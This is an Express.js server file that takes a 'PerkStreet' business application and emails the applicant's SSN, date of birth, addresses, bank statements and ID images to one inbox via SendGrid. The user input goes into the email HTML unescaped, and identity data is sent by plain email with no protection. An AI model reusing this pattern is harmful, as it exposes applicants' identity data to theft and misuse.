const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const dotenv = require('dotenv');
const sgMail = require('@sendgrid/mail');

dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

sgMail.setApiKey(process.env.SENDGRID_API_KEY);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Multer setup
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Serve static files (index.html)
app.use(express.static(path.join(__dirname, '../frontend')));

// Handle form submission
app.post('/submit', upload.fields([
  { name: 'statements', maxCount: 10 },
  { name: 'idFront', maxCount: 1 },
  { name: 'idBack', maxCount: 1 }
]), async (req, res) => {
  try {
    const {
      businessName,
      businessEmail,
      personalEmail,
      phone,
      dob,
      ssn,
      ein,
      position,
      annualRevenue,
      businessAddress,
      homeAddress,
      website
    } = req.body;

    const attachments = [];

    // Handle bank statements
    if (req.files['statements']) {
      req.files['statements'].forEach(file => {
        attachments.push({
          content: file.buffer.toString('base64'),
          filename: file.originalname,
          type: file.mimetype,
          disposition: 'attachment',
        });
      });
    }

    // Handle ID front
    if (req.files['idFront']?.[0]) {
      attachments.push({
        content: req.files['idFront'][0].buffer.toString('base64'),
        filename: req.files['idFront'][0].originalname,
        type: req.files['idFront'][0].mimetype,
        disposition: 'attachment',
      });
    }

    // Handle ID back
    if (req.files['idBack']?.[0]) {
      attachments.push({
        content: req.files['idBack'][0].buffer.toString('base64'),
        filename: req.files['idBack'][0].originalname,
        type: req.files['idBack'][0].mimetype,
        disposition: 'attachment',
      });
    }

    // Compose email
    const emailBody = `
      <h2>New Application Submission</h2>
      <p><strong>Business Name:</strong> ${businessName}</p>
      <p><strong>Business Email:</strong> ${businessEmail}</p>
      <p><strong>Personal Email:</strong> ${personalEmail}</p>
      <p><strong>Phone:</strong> ${phone}</p>
      <p><strong>DOB:</strong> ${dob}</p>
      <p><strong>SSN / Tax ID:</strong> ${ssn}</p>
      <p><strong>EIN / Tax ID (Business):</strong> ${ein}</p>
      <p><strong>Position:</strong> ${position}</p>
      <p><strong>Annual Revenue:</strong> ${annualRevenue}</p>
      <p><strong>Business Address:</strong> ${businessAddress}</p>
      <p><strong>Home Address:</strong> ${homeAddress}</p>
      <p><strong>Business Website:</strong> ${website}</p>
    `;

    const msg = {
      to: process.env.RECEIVER_EMAIL,
      from: process.env.RECEIVER_EMAIL,
      subject: 'New PerkStreet Application',
      html: emailBody,
      attachments: attachments,
    };

    await sgMail.send(msg);

    // Confirmation back to user
    res.send(`
      <h2 style="font-family: Inter, sans-serif;">
        You're all set!<br>
        We've received the application. Our team will review the information and get back to you within two business days.
        Keep an eye on your inbox.
      </h2>
    `);
  } catch (error) {
    console.error('❌ Error submitting form:', error.message || error);
    res.status(500).send('<h3>There was a problem processing your application. Please try again later or contact support.</h3>');
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
});
